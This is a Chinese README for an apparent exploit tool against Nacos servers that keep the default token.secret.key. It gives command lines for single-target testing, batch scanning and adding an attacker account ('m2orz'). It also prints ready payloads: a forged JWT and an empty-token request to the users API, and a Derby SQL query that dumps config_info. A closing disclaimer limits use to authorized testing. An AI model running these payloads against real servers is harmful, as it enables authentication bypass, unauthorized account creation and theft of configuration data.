# Nacos_default.token

Nacos 平台在默认配置下未对 token.secret.key 进行修改，攻击者通过漏洞可以获取服务器数据库/OSS等权限。

## 工具利用

python3 Nacos_default.token.py -u http://127.0.0.1:1111 单个url测试

python3 Nacos_default.token.py -a http://127.0.0.1:1111 添加用户m2orz/zzz321..

python3 Nacos_default.token.py -f url.txt 批量检测

payload1:http://xxx.com/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9

payload2:http://xxx.com/nacos/v1/auth/users?accessToken=&pageNo=1&pageSize=9

23年9月15日更新

增加sql注入扫描

payload4:nacos/v1/cs/ops/derby?sql=select * from config_info

扫描结束后会在当前目录生成存在漏洞url的vuln.txt


## 免责声明

此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。
